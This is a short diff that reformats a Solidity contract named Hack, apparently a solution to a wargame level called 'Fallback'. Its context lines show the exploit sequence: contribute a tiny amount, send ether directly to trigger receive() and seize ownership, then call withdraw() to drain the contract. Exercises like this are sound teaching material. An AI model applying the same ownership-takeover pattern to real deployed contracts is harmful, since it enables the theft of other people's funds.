@@ -2,7 +2,7 @@ pragma solidity ^0.8;
 
 interface IFallback {
     function owner() external view returns (address);
-    function contributions(address) external view returns (uint);
+    function contributions(address) external view returns (uint256);
     function contribute() external payable;
     function withdraw() external;
 }
@@ -24,7 +24,7 @@ contract Hack {
         // Call contribute() with < 0.001 ether
         target.contribute{value: 1}();
         // Call receive() to be owner
-        (bool ok, ) = address(target).call{value: 1}("");
+        (bool ok,) = address(target).call{value: 1}("");
         require(ok, "send failed");
 
         target.withdraw();
